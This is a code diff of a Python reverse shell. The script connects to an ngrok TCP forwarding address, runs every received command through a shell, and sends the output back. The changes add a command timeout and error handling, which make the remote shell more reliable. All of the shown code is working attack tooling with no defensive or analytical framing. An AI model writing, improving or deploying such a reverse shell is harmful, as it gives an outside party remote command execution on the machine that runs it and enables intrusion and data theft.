@@ -31,23 +31,35 @@ run_command("dir C:\\")  # List C drive contents
 import socket
 import subprocess
 
-IP = "0.tcp.in.ngrok.io"   # Host from your ngrok forwarding address
-PORT = 19468               # Port from your ngrok forwarding address
+IP = "0.tcp.in.ngrok.io"   # ngrok host
+PORT = 19468               # ngrok port
 
 s = socket.socket()
 s.connect((IP, PORT))
 
 while True:
-    command = s.recv(1024).decode()
+    command = s.recv(1024).decode().strip()
     if command.lower() in ['exit', 'quit']:
         break
+
     try:
-        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, text=True)
-    except subprocess.CalledProcessError as e:
-        output = e.output
-    s.send(output.encode())
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
+        try:
+            output, error = process.communicate(timeout=5)  # wait max 5 seconds
+        except subprocess.TimeoutExpired:
+            process.kill()
+            output, error = '', '[!] Command timed out or blocked'
+
+        response = output + error
+        if not response.strip():
+            response = '[✓] Command executed (no output)'
+    except Exception as e:
+        response = f'[!] Error: {str(e)}'
+
+    s.send(response.encode())
 
 s.close()
+
 
 
 
